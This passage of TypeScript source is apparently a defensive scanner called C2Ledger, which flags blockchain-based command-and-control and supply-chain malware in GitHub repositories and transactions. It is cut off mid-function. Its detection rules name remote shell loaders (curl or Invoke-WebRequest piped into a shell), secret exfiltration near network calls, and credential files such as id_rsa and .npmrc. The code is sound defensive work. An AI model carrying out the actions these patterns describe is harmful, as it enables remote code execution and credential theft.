
type Sev = "low"|"medium"|"high"|"critical";
type Rule = {id:string; title:string; severity:Sev; weight:number; category:string; re:RegExp; reason:string};

const RULES: Rule[] = [
 {id:"CHAIN_RPC",title:"Blockchain RPC access",severity:"medium",weight:12,category:"onchain",re:new RegExp("(eth_getLogs|eth_getTransaction|eth_call|JsonRpcProvider|Web3|createPublicClient|rpc\\.(?:ankr|alchemy|infura)|(?:ethereum|polygon|bsc|tron|aptos).{0,40}(?:rpc|provider))","i"),reason:"Code appears to query a blockchain RPC/provider."},
 {id:"DEAD_DROP",title:"Possible blockchain dead-drop decoding",severity:"high",weight:22,category:"onchain",re:new RegExp("(tx\\.(?:to|input|data)|transaction\\.(?:to|input|data)|receipt\\.to|calldata).{0,120}(slice|substring|Buffer\\.from|parseInt)","is"),reason:"Transaction/address data appears to be decoded at runtime."},
 {id:"ONCHAIN_PAYLOAD",title:"On-chain payload storage or retrieval",severity:"high",weight:22,category:"onchain",re:new RegExp("(?:bytes(?:\\s+(?:public|private|internal))?\\s+(?:shellcode|payload|command|script)\\b|function\\s+(?:get|set|update|store)(?:Shellcode|Payload|Command|Script)\\b)","i"),reason:"A smart contract appears to store or expose a payload-like byte sequence; this is a hunting signal, not proof of malicious intent."},
 {id:"REMOTE_EXEC",title:"Dynamic code evaluation",severity:"critical",weight:30,category:"execution",re:new RegExp("(eval\\s*\\(|new\\s+Function\\s*\\(|Invoke-Expression|\\biex\\s*\\()","i"),reason:"Dynamic evaluation can turn resolved or downloaded data into code execution."},
 {id:"PROCESS_EXEC",title:"Process execution capability",severity:"medium",weight:14,category:"execution",re:new RegExp("(?:node:)?child_process|spawnSync\\s*\\(|spawn\\s*\\(|execSync\\s*\\(|execFileSync\\s*\\(|(?<!\\.)\\bexecFile\\s*\\(|Bun\\.spawn","i"),reason:"The code can launch local processes; this becomes higher risk when correlated with remote, on-chain or untrusted input."},
 {id:"NATIVE_MEMORY_EXEC",title:"Native executable-memory behavior",severity:"critical",weight:28,category:"execution",re:new RegExp("(VirtualAlloc|VirtualProtect|PAGE_EXECUTE_READWRITE|PROT_EXEC|std::mem::transmute|CreateThread|NtAllocateVirtualMemory)","i"),reason:"The code allocates or converts executable memory, a strong signal when paired with retrieved payload bytes."},
 {id:"RAW_IP",title:"Raw-IP network destination",severity:"high",weight:18,category:"network",re:new RegExp("https?:\\/\\/(?:[0-9]{1,3}\\.){3}[0-9]{1,3}(?::[0-9]{1,5})?","i"),reason:"Direct raw-IP connections are a common post-resolution C2 pattern."},
 {id:"TLS_BYPASS",title:"TLS verification disabled",severity:"critical",weight:28,category:"evasion",re:new RegExp("(NODE_TLS_REJECT_UNAUTHORIZED.{0,15}0|rejectUnauthorized\\s*:\\s*false)","i"),reason:"TLS verification bypass is a strong unsafe or malicious signal."},
 {id:"INSTALL_HOOK",title:"Install-time execution hook",severity:"high",weight:16,category:"supply-chain",re:new RegExp("\\\"(?:preinstall|install|postinstall)\\\"\\s*:\\s*\\\"[^\\\"]+\\\"","i"),reason:"Install hooks execute automatically during dependency installation."},
 {id:"OBFUSCATION",title:"JavaScript obfuscation",severity:"medium",weight:11,category:"evasion",re:new RegExp("(_0x[a-f0-9]{3,}|String\\.fromCharCode|atob\\s*\\(|Buffer\\.from\\([^)]*base64)","i"),reason:"Obfuscation raises risk when paired with networking or execution."},
 {id:"CREDENTIALS",title:"Developer credential access",severity:"high",weight:18,category:"credential",re:new RegExp("(GITHUB_TOKEN|NPM_TOKEN|AWS_SECRET_ACCESS_KEY|CI_JOB_TOKEN|\\.npmrc|id_rsa|Login Data)","i"),reason:"Code references high-value developer credentials or stores."},
 {id:"EDITOR_AUTORUN",title:"Editor autorun surface",severity:"high",weight:20,category:"developer-tool",re:new RegExp("(\\.vscode\\/tasks\\.json|tasks\\.json.{0,100}(shell|process)|cursor.{0,80}(task|extension))","is"),reason:"Editor task/extension surfaces can execute code in trusted developer workflows."},
 {id:"CONFIG_NET",title:"Network behavior in build/config file",severity:"high",weight:20,category:"supply-chain",re:new RegExp("(tailwind\\.config|vite\\.config|webpack\\.config|postcss\\.config|next\\.config).{0,220}(fetch\\s*\\(|https?:\\/\\/|axios|request\\s*\\()","is"),reason:"Build/config files performing network retrieval deserve review."},
 {id:"SHELL_LOADER",title:"Remote shell loader",severity:"critical",weight:32,category:"execution",re:new RegExp("(?:curl|wget)[^\\n]{0,260}\\|\\s*(?:sh|bash|zsh|powershell|pwsh)\\b|(?:Invoke-WebRequest|iwr)[^\\n]{0,260}\\|\\s*(?:Invoke-Expression|iex)\\b","i"),reason:"Remote content appears to flow directly into a shell or command interpreter."},
 {id:"SECRET_EXFIL",title:"Potential secret exfiltration",severity:"critical",weight:28,category:"credential",re:new RegExp("(GITHUB_TOKEN|NPM_TOKEN|AWS_SECRET_ACCESS_KEY|CI_JOB_TOKEN).{0,180}(curl|wget|fetch|axios)|(?:curl|wget|fetch|axios).{0,180}(GITHUB_TOKEN|NPM_TOKEN|AWS_SECRET_ACCESS_KEY|CI_JOB_TOKEN)","is"),reason:"High-value CI or developer secrets appear near an outbound network sink."},
 {id:"GHA_UNTRUSTED",title:"Potentially unsafe GitHub Actions trust boundary",severity:"high",weight:30,category:"supply-chain",re:new RegExp("pull_request_target.{0,500}(checkout|github\\.event\\.pull_request\\.head|ref:)","is"),reason:"A pull_request_target workflow appears to consume pull-request-controlled content and deserves manual review."},
 {id:"ENCODED_EXEC",title:"Encoded payload execution",severity:"high",weight:22,category:"evasion",re:new RegExp("(base64\\s+-d|fromBase64|Buffer\\.from\\([^)]*base64).{0,180}(sh|bash|eval|exec|spawn|Function)|(?:sh|bash|eval|exec|spawn|Function).{0,180}(base64\\s+-d|fromBase64|Buffer\\.from\\([^)]*base64)","is"),reason:"Encoded data appears correlated with an execution sink."}
];

const rank:Record<Sev,number>={low:1,medium:2,high:3,critical:4};

function excerpt(content:string,re:RegExp){
 const m=content.match(re); if(!m||m.index===undefined) return "";
 const a=Math.max(0,m.index-60), b=Math.min(content.length,m.index+Math.min(m[0].length,180)+90);
 return content.slice(a,b).replace(/\\s+/g," ").slice(0,300);
}

function scan(content:string,path:string){
 const findings:any[]=[];
 for(const r of RULES){
  if(r.re.test(content)) findings.push({id:r.id,title:r.title,severity:r.severity,category:r.category,weight:r.weight,reason:r.reason,evidence:excerpt(content,r.re)});
 }
 const cats=new Set(findings.map(f=>f.category)); let bonus=0; const correlations:string[]=[];
 if(cats.has("onchain")&&cats.has("execution")){bonus+=20;correlations.push("on-chain resolution + execution");}
 if(cats.has("onchain")&&cats.has("network")){bonus+=12;correlations.push("on-chain resolution + raw-IP networking");}
 if(cats.has("supply-chain")&&(cats.has("execution")||cats.has("credential"))){bonus+=14;correlations.push("supply-chain execution/credential chain");}
 if(cats.has("evasion")&&cats.has("execution")){bonus+=10;correlations.push("evasion + execution");}
 const score=Math.min(100,findings.reduce((n,f)=>n+f.weight,0)+bonus);
 const verdict=score>=80?"CRITICAL":score>=55?"HIGH":score>=30?"ELEVATED":score>=12?"WATCH":"LOW";
 findings.sort((a,b)=>rank[b.severity as Sev]-rank[a.severity as Sev]||b.weight-a.weight);
 return {product:"C2Ledger",version:"0.9.1",verdict,score,path,findings,correlations,scannedBytes:new TextEncoder().encode(content).length,scannedAt:new Date().toISOString(),
 guidance:score>=55?["Do not execute this code until reviewed.","Inspect dependency provenance and recent lockfile changes.","Hunt for blockchain RPC followed by raw-IP or child-process activity."]:["No high-confidence blockchain-C2 attack chain was established by this static pass.","Treat this as one signal; behavioral telemetry still matters."]};
}


async function scanGithub(repoUrl:string){
 let parsed:URL; try{parsed=new URL(repoUrl.trim());}catch{throw new Error("Use a public GitHub repository URL like https://github.com/owner/repo");}
 if(parsed.protocol!=="https:"||parsed.hostname!=="github.com") throw new Error("Only https://github.com public repository URLs are accepted");
 const parts=parsed.pathname.split("/").filter(Boolean); if(parts.length!==2) throw new Error("Use a repository root URL like https://github.com/owner/repo");
 const owner=parts[0],repo=parts[1].endsWith(".git")?parts[1].slice(0,-4):parts[1];
 if(!/^[A-Za-z0-9_.-]+$/.test(owner)||!/^[A-Za-z0-9_.-]+$/.test(repo)) throw new Error("Invalid GitHub owner or repository name");
 const base="https://api.github.com/repos/"+owner+"/"+repo;
 const headers={"accept":"application/vnd.github+json","user-agent":"C2Ledger/0.9"};
 const repoRes=await safeGithubFetch(base,{headers}); if(!repoRes.ok) throw new Error("GitHub repository lookup failed: HTTP "+repoRes.status);
 const meta:any=await repoRes.json(); if(meta.private) throw new Error("Private repositories require GitHub App credentials");
 const branch=String(meta.default_branch||"main");
 const treeRes=await safeGithubFetch(base+"/git/trees/"+encodeURIComponent(branch)+"?recursive=1",{headers}); if(!treeRes.ok) throw new Error("GitHub tree lookup failed: HTTP "+treeRes.status);
 const tree:any=await treeRes.json();
 const paths=(tree.tree||[]).filter((x:any)=>x.type==="blob"&&typeof x.path==="string"&&(x.size||0)<=240000).map((x:any)=>x.path);
 const lower=(p:string)=>p.toLowerCase(), baseName=(p:string)=>lower(p).split("/").pop()||"";
 const isWorkflow=(p:string)=>lower(p).startsWith(".github/workflows/")&&/\.ya?ml$/.test(lower(p));
 const isDoc=(p:string)=>/\.(?:md|mdx|rst|txt)$/.test(lower(p));
 const isTest=(p:string)=>/(^|\/)(?:test|tests|testcases|fixtures|examples?|samples?)(\/|$)/.test(lower(p));
 const isManifest=(p:string)=>["package.json","bun.lock","bun.lockb","package-lock.json","pnpm-lock.yaml","yarn.lock","dockerfile","makefile","tasks.json"].includes(baseName(p));
 const isCode=(p:string)=>[".mjs",".cjs",".js",".jsx",".ts",".tsx",".py",".go",".rs",".java",".kt",".rb",".php",".sh",".bash",".zsh",".ps1",".yml",".yaml",".toml",".sol",".html",".htm",".vue",".svelte"].some(e=>lower(p).endsWith(e));
 const skip=(p:string)=>["node_modules/","dist/","build/","vendor/","coverage/","target/","out/"].some(s=>lower(p).includes(s));
 const runtime=paths.filter(p=>isCode(p)&&!skip(p)&&!isWorkflow(p)&&!isTest(p)).sort((a,b)=>a.localeCompare(b)).slice(0,52);
 const manifests=paths.filter(p=>isManifest(p)&&!skip(p)).slice(0,10);
 const workflows=paths.filter(isWorkflow).slice(0,8);
 const tests=paths.filter(p=>isCode(p)&&isTest(p)&&!skip(p)).slice(0,8);
 const docs=paths.filter(p=>isDoc(p)&&!skip(p)).slice(0,6);
 const selected=[...manifests,...runtime,...workflows,...tests,...docs].filter((v,i,a)=>a.indexOf(v)===i).slice(0,80);
 const files:any[]=[]; let totalBytes=0, fetched=0;
 function contextual(path:string,content:string,result:any){
  const wf=isWorkflow(path),doc=isDoc(path),test=isTest(path);
  const untrusted=/pull_request_target|github\.event\.pull_request\.(?:head|head\.sha)|allow-unsafe-pr-checkout/i.test(content);
  const mitigated=/environment\s*:/i.test(content)&&/persist-credentials\s*:\s*false/i.test(content);
  const fs=(result.findings||[]).flatMap((f:any)=>{
   if(wf&&(f.id==="CREDENTIALS"||f.id==="CHAIN_RPC")) return [];
   if(f.id==="SECRET_EXFIL"&&/api\\.github\\.com/i.test(content)&&/GITHUB_TOKEN/i.test(content)&&!/(?:https?:\\/\\/(?:\\d{1,3}\\.){3}\\d{1,3}|NPM_TOKEN|AWS_SECRET_ACCESS_KEY|CI_JOB_TOKEN)/i.test(content)) return [];
   if(wf&&f.id==="REMOTE_EXEC"&&!untrusted) return [];
   if(wf&&f.id==="GHA_UNTRUSTED"&&mitigated) return [{...f,severity:"medium",weight:18,reason:f.reason+" Mitigations detected; manual review still recommended."}];
   return [f];
  });
  const cats=new Set(fs.map((f:any)=>f.category)); let bonus=0; const correlations:string[]=[];
  if(cats.has("onchain")&&cats.has("execution")){bonus+=20;correlations.push("on-chain resolution + execution");}
  if(cats.has("onchain")&&cats.has("network")){bonus+=12;correlations.push("on-chain resolution + raw-IP networking");}
  if(cats.has("supply-chain")&&(cats.has("execution")||cats.has("credential"))){bonus+=14;correlations.push("supply-chain execution/credential chain");}
  if(cats.has("evasion")&&cats.has("execution")){bonus+=10;correlations.push("evasion + execution");}
  let score=Math.min(100,fs.reduce((n:number,f:any)=>n+(f.weight||0),0)+bonus);
  if(doc) score=Math.min(score,20);
  if(test&&!fs.some((f:any)=>["SHELL_LOADER","SECRET_EXFIL","TLS_BYPASS","ENCODED_EXEC","RAW_IP"].includes(f.id))) score=Math.min(score,24);
  const verdict=score>=80?"CRITICAL":score>=55?"HIGH":score>=30?"ELEVATED":score>=12?"WATCH":"LOW";
  return {...result,score,verdict,findings:fs,correlations};
 }
 for(const path of selected){
  const raw="https://raw.githubusercontent.com/"+owner+"/"+repo+"/"+encodeURIComponent(branch)+"/"+path.split("/").map(encodeURIComponent).join("/");
  const r=await safeGithubFetch(raw,{headers:{"user-agent":"C2Ledger/0.9"}}); if(!r.ok) continue;
  const content=await r.text(); const bytes=new TextEncoder().encode(content).length;
  if(totalBytes+bytes>3500000) break; totalBytes+=bytes; fetched++;
  const result=contextual(path,content,scan(content,path));
  if(result.findings.length) files.push({path,score:result.score,verdict:result.verdict,findings:result.findings,correlations:result.correlations});
 }
 const all=files.flatMap((f:any)=>f.findings.map((x:any)=>({...x,path:f.path})));
 const topFileScore=files.reduce((n:number,f:any)=>Math.max(n,f.score),0);
 const highConfidence=all.some((f:any)=>["REMOTE_EXEC","NATIVE_MEMORY_EXEC","SHELL_LOADER","SECRET_EXFIL","TLS_BYPASS","ENCODED_EXEC","RAW_IP","DEAD_DROP"].includes(f.id))||files.some((f:any)=>(f.correlations||[]).some((x:string)=>x==="on-chain resolution + execution"||x==="on-chain resolution + raw-IP networking"));
 let score=topFileScore;
 if(!highConfidence&&score>24) score=24;
 const verdict=score>=80?"CRITICAL":score>=55?"HIGH":score>=30?"ELEVATED":score>=12?"WATCH":"LOW";
 const huntingSignals=Array.from(new Set(files.flatMap((f:any)=>f.correlations||[])));
 return {product:"C2Ledger",version:PRODUCT_VERSION,repository:owner+"/"+repo,branch,verdict,score,filesScanned:fetched,filesSelected:selected.length,filesWithFindings:files.length,bytesFetched:totalBytes,correlations:huntingSignals,files,limitations:["Public GitHub repositories only","Maximum 80 selected files and ~3.5 MB fetched","Static analysis; no untrusted code is executed"],selection:{candidateFiles:paths.length,selectedFiles:selected.length,coveragePct:paths.length?Math.round(selected.length/paths.length*10000)/100:0,workflowCap:8,docsCap:6,testCap:8},scannedAt:new Date().toISOString()};
}

const ASTRA_BRICKS = [
 {id:"MYTHOS_ASTRA_OMEGA",version:"1.0",status:"IMPLEMENTED",role:"SPEC→BUILD→ADVERSARY→REPAIR→VERIFY²"},
 {id:"BRICK_PROOF_GATE",version:"1.0",status:"IMPLEMENTED",role:"evidence-backed PASS/PARTIAL/FAIL"},
 {id:"EVIDENCE_LEDGER",version:"1.0",status:"RUNTIME",role:"content-addressed scan evidence in private object storage"},
 {id:"TARDIGRADE_OMEGA",version:"1.0",status:"RUNTIME",role:"fail-closed self-tests and degraded-state reporting"},
 {id:"BENCHMARK_X10",version:"1.0",status:"RUNTIME",role:"repeatable benign/malicious regression benchmark"},
 {id:"CONNECTOR_GUARD",version:"1.0",status:"IMPLEMENTED",role:"strict outbound GitHub hostname allowlist + timeouts"},
 {id:"SINGLE_SOURCE_RELEASE_GATE",version:"1.0",status:"RUNTIME",role:"release/deployment fingerprint in proof surface"},
 {id:"RELIABILITY_LAYER",version:"1.0",status:"RUNTIME",role:"health, deep health, gate and explicit partial states"},
 {id:"DESIGN_INTELLIGENCE",version:"1.0",status:"IMPLEMENTED",role:"evidence-first operator dashboard"},
 {id:"NEGATIVE_KNOWLEDGE_OMEGA",version:"1.0",status:"RUNTIME",role:"records benign counterexamples and false-positive pressure"},
 {id:"DUALITY_ARBITER",version:"1.0",status:"RUNTIME",role:"attack hypothesis vs benign hypothesis with explicit arbiter verdict"},
 {id:"OMEGA_EVIDENCE_REPLAY",version:"1.0",status:"RUNTIME",role:"deterministic replay capsule from rulepack + sanitized result"},
 {id:"AGENTSHIELD",version:"1.0",status:"IMPLEMENTED",role:"untrusted-input isolation, no execution, bounded outbound connectors"},
 {id:"ASTRA_HARNESS",version:"1.0",status:"RUNTIME",role:"orchestrates proof, benchmark, evidence and release promotion decision"},
 {id:"RELEASE_CONTROL_PLANE",version:"1.0",status:"RUNTIME",role:"pins audited version and rulepack hash; blocks drift"},
 {id:"THREAT_INTEL_FUSION",version:"1.0",status:"RUNTIME",role:"persistent IOC feed and cross-signal incident correlation"},
 {id:"MULTICHAIN_SENSOR",version:"1.0",status:"RUNTIME",role:"defensive transaction metadata inspection across Ethereum, BNB, Polygon, TRON and Aptos"},
 {id:"INCIDENT_LEDGER",version:"1.0",status:"RUNTIME",role:"persistent incident history backed by private object storage"},
 {id:"TENANT_API",version:"1.0",status:"RUNTIME",role:"hashed enterprise API keys with tenant isolation"},
 {id:"MOAT_DATA_ENGINE",version:"1.0",status:"RUNTIME",role:"accumulates normalized defensive observations into proprietary threat intelligence"},
 {id:"SARIF_EXPORT",version:"1.0",status:"RUNTIME",role:"GitHub/SIEM-compatible machine-readable security findings"},
 {id:"CI_PR_GATE",version:"1.0",status:"RUNTIME",role:"HTTP gate blocks CI on configurable risk threshold"},
 {id:"GITHUB_WEBHOOK_RECEIVER",version:"1.0",status:"RUNTIME",role:"HMAC-verified push and pull-request event ingestion"},
 {id:"ALERT_QUEUE",version:"1.0",status:"RUNTIME",role:"durable outbound alert queue with SSRF-safe webhook delivery"},
 {id:"LONGITUDINAL_REPUTATION",version:"1.0",status:"RUNTIME",role:"historical indicator reputation from recurrence, confidence and cross-chain observations"},
 {id:"SOC_DASHBOARD",version:"1.0",status:"RUNTIME",role:"analyst-facing incident, IOC, chain and assurance dashboard"},
 {id:"STIX21_EXPORT",version:"1.0",status:"RUNTIME",role:"standards-based threat-intel bundle export"},
 {id:"TENANT_QUOTA_METER",version:"1.0",status:"RUNTIME",role:"per-tenant monthly usage accounting and quota enforcement"},
 {id:"INCIDENT_LIFECYCLE",version:"1.0",status:"RUNTIME",role:"OPEN→ACKNOWLEDGED→RESOLVED/FALSE_POSITIVE workflow"},
 {id:"OPENAPI_CONTRACT",version:"1.0",status:"RUNTIME",role:"machine-readable API contract for enterprise integration"},
 {id:"ALERT_DISPATCHER",version:"1.0",status:"RUNTIME",role:"scheduled delivery of queued security alerts"},
 {id:"COMMERCIAL_ONBOARDING",version:"1.0",status:"RUNTIME",role:"pilot application and approval workflow"},
 {id:"TENANT_KEY_ROTATION",version:"1.0",status:"RUNTIME",role:"self-service API key rotation with one-time secret disclosure"},
 {id:"TENANT_AUDIT_TRAIL",version:"1.0",status:"RUNTIME",role:"append-only tenant activity trail in private storage"},
 {id:"PRICING_PACKAGING",version:"1.0",status:"RUNTIME",role:"pilot/team/SOC/enterprise commercial packaging"},
 {id:"ENTERPRISE_READINESS",version:"1.0",status:"RUNTIME",role:"security, assurance, quota and audit evidence for buyers"}
];

const PRODUCT_VERSION="0.9.1";
const RELEASE_ID=String(Bun.env.C2LEDGER_RELEASE_ID||"dev");
const GITHUB_ALLOWED=new Set(["api.github.com","raw.githubusercontent.com"]);
const CHAIN_ALLOWED=new Set(["ethereum-rpc.publicnode.com","bsc-rpc.publicnode.com","polygon-bor-rpc.publicnode.com","api.trongrid.io","fullnode.mainnet.aptoslabs.com"]);
const SUPPORTED_CHAINS=["ethereum","bsc","polygon","tron","aptos"] as const;
type SupportedChain=(typeof SUPPORTED_CHAINS)[number];

async function sha256Hex(value:string){
 const bytes=new TextEncoder().encode(value);
 const digest=await crypto.subtle.digest("SHA-256",bytes);
 return Array.from(new Uint8Array(digest)).map(b=>b.toString(16).padStart(2,"0")).join("");
}

function rulepackDescriptor(){
 return RULES.map(r=>({id:r.id,title:r.title,severity:r.severity,weight:r.weight,category:r.category,reason:r.reason}));
}

async function currentRulepackHash(){
 return await sha256Hex(JSON.stringify(rulepackDescriptor()));
}

function cleanForLedger(value:any):any{
 if(Array.isArray(value)) return value.map(cleanForLedger);
 if(value&&typeof value==="object"){
  const out:any={};
  for(const [k,v] of Object.entries(value)){
   if(k==="evidence") continue;
   out[k]=cleanForLedger(v);
  }
  return out;
 }
 return value;
}

function s3Client(){
 if(!Bun.env.S3_BUCKET||!Bun.env.S3_ENDPOINT||!Bun.env.S3_ACCESS_KEY_ID||!Bun.env.S3_SECRET_ACCESS_KEY) return null;
 return new Bun.S3Client({
  accessKeyId:Bun.env.S3_ACCESS_KEY_ID,
  secretAccessKey:Bun.env.S3_SECRET_ACCESS_KEY,
  endpoint:Bun.env.S3_ENDPOINT,
  bucket:Bun.env.S3_BUCKET,
  region:Bun.env.S3_REGION||"auto"
 });
}

async function persistEvidence(kind:string,inputRef:string,result:any){
 const client=s3Client();
 const inputHash=await sha256Hex(inputRef);
 const sanitized=cleanForLedger(result);
 const rulepackHash=await currentRulepackHash();
 const record:any={schema:"c2ledger-evidence/v1",kind,releaseId:RELEASE_ID,rulepackHash,inputHash,result:sanitized,createdAt:new Date().toISOString(),runtime:{deploymentId:Bun.env.RAILWAY_DEPLOYMENT_ID||null,serviceId:Bun.env.RAILWAY_SERVICE_ID||null,environmentId:Bun.env.RAILWAY_ENVIRONMENT_ID||null}};
 const canonical=JSON.stringify(record);
 const digest=await sha256Hex(canonical);
 const day=record.createdAt.slice(0,10);
 const key="evidence/"+day+"/"+digest+".json";
 if(!client) return {status:"PARTIAL",reason:"evidence-store-unconfigured",digest,inputHash,rulepackHash,key:null};
 try{
  await client.write(key,canonical,{type:"application/json"});
  const exists=await client.exists(key);
  return exists?{status:"PASS",digest,inputHash,rulepackHash,key}:{status:"PARTIAL",reason:"write-not-visible",digest,inputHash,rulepackHash,key};
 }catch(e:any){
  return {status:"PARTIAL",reason:String(e?.message||e),digest,inputHash,rulepackHash,key};
 }
}

async function probeEvidenceStore(){
 const client=s3Client();
 if(!client) return {status:"FAIL",reason:"unconfigured"};
 const key="probes/"+String(Bun.env.RAILWAY_DEPLOYMENT_ID||"local")+".json";
 const body=JSON.stringify({probe:"C2Ledger",releaseId:RELEASE_ID,time:new Date().toISOString()});
 try{
  await client.write(key,body,{type:"application/json"});
  const read=await client.file(key).text();
  await client.delete(key);
  return {status:read===body?"PASS":"FAIL",roundTrip:read===body};
 }catch(e:any){return {status:"FAIL",reason:String(e?.message||e)};}
}

async function safeGithubFetch(url:string,init:any={}){
 const u=new URL(url);
 if(u.protocol!=="https:"||!GITHUB_ALLOWED.has(u.hostname)) throw new Error("CONNECTOR_GUARD blocked outbound host: "+u.hostname);
 return await fetch(url,{...init,redirect:"error",signal:AbortSignal.timeout(7000)});
}


async function safeChainFetch(url:string,init:any={}){
 const u=new URL(url);
 if(u.protocol!=="https:"||!CHAIN_ALLOWED.has(u.hostname)) throw new Error("CONNECTOR_GUARD blocked chain host: "+u.hostname);
 return await fetch(url,{...init,redirect:"error",signal:AbortSignal.timeout(8000)});
}

async function readState<T>(key:string,fallback:T):Promise<T>{
 const client=s3Client(); if(!client) return fallback;
 try{
  if(!(await client.exists(key))) return fallback;
  const txt=await client.file(key).text();
  return JSON.parse(txt) as T;
 }catch{return fallback;}
}
async function writeState(key:string,value:any){
 const client=s3Client(); if(!client) throw new Error("state store unavailable");
 await client.write(key,JSON.stringify(value),{type:"application/json"});
 return true;
}
function bearer(req:Request){
 const h=req.headers.get("authorization")||"";
 return h.startsWith("Bearer ")?h.slice(7).trim():"";
}
function adminAuthorized(req:Request){
 const expected=String(Bun.env.C2LEDGER_ADMIN_TOKEN||"");
 const got=bearer(req);
 return !!expected&&got.length===expected.length&&got===expected;
}
async function tenantAuthorized(req:Request){
 const token=bearer(req); if(!token) return null;
 const hash=await sha256Hex(token);
 const state:any=await readState("state/tenants.json",{tenants:[]});
 return (state.tenants||[]).find((t:any)=>t.active!==false&&t.keyHash===hash)||null;
}
function normalizeIndicator(type:string,value:string){
 const v=String(value||"").trim().slice(0,512);
 if(!v) return null;
 if(type==="txHash"||type==="payloadHash") return /^[0-9a-fA-Fx]{16,130}$/.test(v)?v.toLowerCase():null;
 if(type==="rawIp") return /^(?:\d{1,3}\.){3}\d{1,3}(?::\d{1,5})?$/.test(v)?v:null;
 if(type==="domain") return /^[a-z0-9.-]{3,253}$/i.test(v)?v.toLowerCase():null;
 if(type==="address") return /^[a-zA-Z0-9:_-]{8,128}$/.test(v)?v:null;
 return null;
}
async function ingestIntel(body:any,sourceTenant:string){
 const chain=String(body?.chain||"").toLowerCase() as SupportedChain;
 if(!SUPPORTED_CHAINS.includes(chain)) throw new Error("unsupported chain");
 const now=new Date().toISOString();
 const candidates=[
  ["txHash",body?.txHash],["address",body?.address||body?.contract],["rawIp",body?.rawIp],
  ["domain",body?.domain],["payloadHash",body?.payloadHash]
 ];
 const indicators:any[]=[];
 for(const [type,val] of candidates){
  if(val===undefined||val===null) continue;
  const value=normalizeIndicator(String(type),String(val));
  if(value) indicators.push({type,value});
 }
 if(!indicators.length) throw new Error("at least one normalized indicator is required");
 const confidence=Math.max(0,Math.min(100,Number(body?.confidence??50)||50));
 const tags=Array.isArray(body?.tags)?body.tags.map((x:any)=>String(x).slice(0,48)).slice(0,12):[];
 const feed:any=await readState("state/intel-feed.json",{schema:"c2ledger-intel/v1",items:[]});
 for(const ind of indicators){
  const id=await sha256Hex(chain+"|"+ind.type+"|"+ind.value);
  const existing=(feed.items||[]).find((x:any)=>x.id===id);
  if(existing){
   existing.lastSeen=now; existing.seenCount=(existing.seenCount||1)+1; existing.confidence=Math.max(existing.confidence||0,confidence);
   existing.tags=Array.from(new Set([...(existing.tags||[]),...tags])).slice(0,20);
   existing.sources=Array.from(new Set([...(existing.sources||[]),sourceTenant])).slice(0,20);
  }else{
   feed.items.unshift({id,chain,type:ind.type,value:ind.value,confidence,firstSeen:now,lastSeen:now,seenCount:1,tags,sources:[sourceTenant]});
  }
 }
 feed.items=(feed.items||[]).sort((a:any,b:any)=>String(b.lastSeen).localeCompare(String(a.lastSeen))).slice(0,2000);
 feed.updatedAt=now; await writeState("state/intel-feed.json",feed);
 const incidentId=await sha256Hex(JSON.stringify({chain,indicators,now,sourceTenant}));
 const severity=(indicators.some(x=>x.type==="rawIp"||x.type==="payloadHash")&&indicators.some(x=>x.type==="txHash"||x.type==="address"))?"HIGH":confidence>=80?"ELEVATED":"WATCH";
 const incident={id:incidentId,chain,severity,confidence,indicatorIds:await Promise.all(indicators.map(async x=>await sha256Hex(chain+"|"+x.type+"|"+x.value))),tags,source:sourceTenant,createdAt:now,status:"OPEN"};
 await updateReputation(chain,indicators,confidence,tags);
 const history:any=await readState("state/incidents.json",{schema:"c2ledger-incidents/v1",items:[]});
 history.items=[incident,...(history.items||[])].slice(0,1000); history.updatedAt=now; await writeState("state/incidents.json",history);
 await persistEvidence("threat-intel-observation",JSON.stringify({chain,indicators,sourceTenant}),incident);
 if(severity==="HIGH"||severity==="ELEVATED") await queueAlert({kind:"threat-intel",incident});
 return {status:"PASS",incident,indicators,feedSize:feed.items.length};
}
async function matchIntel(chain:string,values:string[]){
 const feed:any=await readState("state/intel-feed.json",{items:[]});
 const wanted=new Set(values.map(v=>String(v).toLowerCase()));
 return (feed.items||[]).filter((x:any)=>x.chain===chain&&wanted.has(String(x.value).toLowerCase())).slice(0,100);
}
async function inspectTransaction(chain:SupportedChain,txHash:string){
 const hash=String(txHash||"").trim();
 if(!hash) throw new Error("txHash is required");
 let meta:any={chain,txHash:hash,source:null};
 if(chain==="ethereum"||chain==="bsc"||chain==="polygon"){
  const url=chain==="ethereum"?"https://ethereum-rpc.publicnode.com":chain==="bsc"?"https://bsc-rpc.publicnode.com":"https://polygon-bor-rpc.publicnode.com";
  const r=await safeChainFetch(url,{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({jsonrpc:"2.0",id:1,method:"eth_getTransactionByHash",params:[hash]})});
  if(!r.ok) throw new Error("chain RPC HTTP "+r.status);
  const j:any=await r.json(); if(!j?.result) throw new Error("transaction not found");
  const x=j.result; meta={...meta,source:new URL(url).hostname,from:x.from||null,to:x.to||null,blockNumber:x.blockNumber||null,inputBytes:typeof x.input==="string"?Math.max(0,(x.input.length-2)/2):0,selector:typeof x.input==="string"&&x.input.length>=10?x.input.slice(0,10):null,value:x.value||null};
 }else if(chain==="tron"){
  const url="https://api.trongrid.io/wallet/gettransactionbyid";
  const r=await safeChainFetch(url,{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({value:hash})});
  if(!r.ok) throw new Error("TRON API HTTP "+r.status); const j:any=await r.json();
  if(!j?.txID) throw new Error("transaction not found");
  meta={...meta,source:"api.trongrid.io",blockRef:j.raw_data?.ref_block_num??null,contracts:Array.isArray(j.raw_data?.contract)?j.raw_data.contract.map((x:any)=>x.type).slice(0,8):[],dataBytes:typeof j.raw_data?.data==="string"?j.raw_data.data.length/2:0};
 }else{
  const url="https://fullnode.mainnet.aptoslabs.com/v1/transactions/by_hash/"+encodeURIComponent(hash);
  const r=await safeChainFetch(url,{headers:{"accept":"application/json"}}); if(!r.ok) throw new Error("Aptos API HTTP "+r.status); const j:any=await r.json();
  meta={...meta,source:"fullnode.mainnet.aptoslabs.com",sender:j.sender||null,version:j.version||null,type:j.type||null,success:j.success??null,payloadType:j.payload?.type||null,function:j.payload?.function||null};
 }
 const values=[meta.from,meta.to,meta.sender,hash].filter(Boolean).map(String);
 const matches=await matchIntel(chain,values);
 const risk=matches.length?Math.min(100,50+matches.reduce((n:number,x:any)=>n+Math.round((x.confidence||0)/10),0)):0;
 return {product:"C2Ledger",version:PRODUCT_VERSION,mode:"defensive-metadata-only",chain,transaction:meta,intelMatches:matches,riskScore:risk,verdict:risk>=80?"HIGH":risk>=40?"ELEVATED":"LOW",note:"No payload or contract code is executed."};
}
async function probeMoatLayer(){
